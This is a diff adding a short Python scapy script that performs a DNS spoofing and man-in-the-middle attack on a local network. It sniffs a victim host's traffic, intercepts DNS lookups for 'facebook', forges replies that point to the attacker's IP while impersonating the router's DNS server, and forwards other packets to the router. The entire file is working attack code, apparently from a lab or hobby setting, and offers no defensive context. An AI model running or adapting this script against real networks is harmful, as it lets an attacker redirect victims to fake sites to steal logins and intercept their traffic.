@@ -1,0 +1,36 @@
+from __future__ import print_function
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+ 
+router_mac = 'c4:e9:84:6d:7c:92'
+dns_server_ip = '192.168.0.1'
+bpf_filt = 'udp dst port 53' 
+attacker_ip = '192.168.0.104'
+
+attacker_mac = '08:00:27:ed:5b:9f'
+spoofed_ip = '192.168.0.104'
+ 
+def dns_responder(pktList):
+    pkt = pktList[0]
+    if pkt.haslayer(DNS): 
+        if "facebook" in str(pkt[DNSQR].qname):
+            
+            response = sr1(IP(dst='8.8.8.8')/UDP(sport=pkt[UDP].sport)/\
+                DNS(rd=1,id=pkt[DNS].id,qd=DNSQR(qname=pkt[DNSQR].qname)), verbose=0)
+
+            respPkt = Ether(src=router_mac, dst=pkt[Ether].src)/IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport)/DNS()
+            respPkt[DNS] = response[DNS]
+            respPkt[DNSRR].rdata = spoofed_ip
+            respPkt[DNSRR][1].rdata = spoofed_ip
+
+            respPkt[IP].src = dns_server_ip
+
+            respPkt.show()
+            sendp(respPkt)
+    else:
+        pkt.dst = router_mac
+        # pkt.show()
+        sendp(pkt)
+
+pkt = sniff(filter="host 192.168.0.103", prn = dns_responder)
